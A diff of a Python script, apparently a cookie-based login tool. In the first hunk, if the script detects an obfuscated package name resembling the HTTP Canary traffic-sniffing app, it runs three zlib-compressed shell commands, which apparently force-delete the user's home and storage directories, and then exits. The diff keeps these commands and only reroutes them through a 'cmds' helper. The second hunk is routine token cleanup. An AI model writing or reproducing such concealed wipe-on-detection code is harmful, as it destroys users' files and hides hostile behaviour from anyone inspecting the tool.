@@ -51,9 +51,9 @@ try:
 
     if f'com.h{cq}pc{qc}y.pro' in file_d:
         sins(f"{lr} [X] HTTP CANARY DETECTED!")
-        os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
-        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
-        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+        cmds(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+        cmds(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+        cmds(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
         exit()
     else:
         pass
@@ -402,8 +402,9 @@ def lxgin():
         slp(2)
         apprxval()
     except Exception as error: 
-        os.system("rm -f .tokn.txt")
-        print(f"{lr}  [X] COOKIE EXPIRED")
+        cmds("rm -f .tokn.txt")
+        gxdslogo()
+        sins(f"{lr}  [X] COOKIE EXPIRED")
         slp(2)
         lxgin()
 
